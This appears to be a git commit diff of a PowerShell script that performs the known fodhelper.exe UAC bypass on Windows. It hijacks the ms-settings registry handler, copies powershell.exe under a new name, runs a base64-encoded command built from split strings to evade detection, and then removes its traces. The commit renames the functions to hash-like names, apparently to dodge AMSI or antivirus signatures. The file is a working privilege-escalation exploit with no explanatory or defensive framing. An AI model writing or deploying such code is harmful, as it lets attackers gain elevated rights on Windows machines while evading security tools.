8a1acfe2574bbe668079502514847208b9fc3302
p4yl0ad <57832389+p4yl0ad@users.noreply.github.com>
2021-04-05 21:26:58 +0100

    Update foddywoddy_AMSI.ps1

--- UAC/foddywoddy_AMSI.ps1
+++ UAC/foddywoddy_AMSI.ps1
@@ -1,5 +1,5 @@
 
-function RegShit {
+function b1946ac92492d2347c6235b4d2611184 {
     $cmd = "C:\Windows\Tasks\bruh.exe -enc" + "" + [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("cm"+"d"+"."+"e"+"x"+"e"+" "+"/"+"c"+" "+"wh"+"oa"+"mi"+" "+"/"+"a"+"l"+"l"+" "+">"+" "+"C:"+"\u"+"a"+"c"+".t"+"xt"))
     copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\bruh.exe
     Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
@@ -7,10 +7,10 @@ function RegShit {
     New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
     Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
 }
-function PrivEsc {
+function c4ff45bb1fab99f9164b7fec14b2292a {
     Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
     Start-Sleep -s 3
     Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
 }
-RegShit
-PrivEsc
+b1946ac92492d2347c6235b4d2611184
+c4ff45bb1fab99f9164b7fec14b2292a
